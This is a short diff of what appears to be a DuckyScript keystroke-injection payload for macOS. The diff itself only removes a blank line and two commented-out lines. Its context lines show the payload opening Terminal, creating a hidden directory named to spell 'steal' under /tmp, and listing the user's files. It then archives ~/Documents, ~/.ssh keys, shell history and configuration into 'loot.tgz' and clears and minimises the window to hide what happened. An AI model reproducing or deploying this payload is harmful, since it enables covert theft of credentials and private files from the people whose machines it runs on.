@@ -10,7 +10,6 @@ STRING Terminal
 ENTER
 DELAY 100
 
-
 STRING mkdir -p /tmp/.s/.t/.e/.a/.l && cd /tmp/.s/.t/.e/.a/.l && find . ~/Downloads >> Downloads.list && find ~/ >> home_dir_file_list.txt && tar cfz loot.tgz ~/Documents ~/.ssh ~/.bash* ~/.config ~/.zsh* &
 ENTER
 DELAY 10
@@ -22,6 +21,3 @@ STRING wait %1 && echo "All Done" && clear && exit
 ENTER
 DELAY 10
 GUI m
-
-REM # GUI q
-REM # ENTER
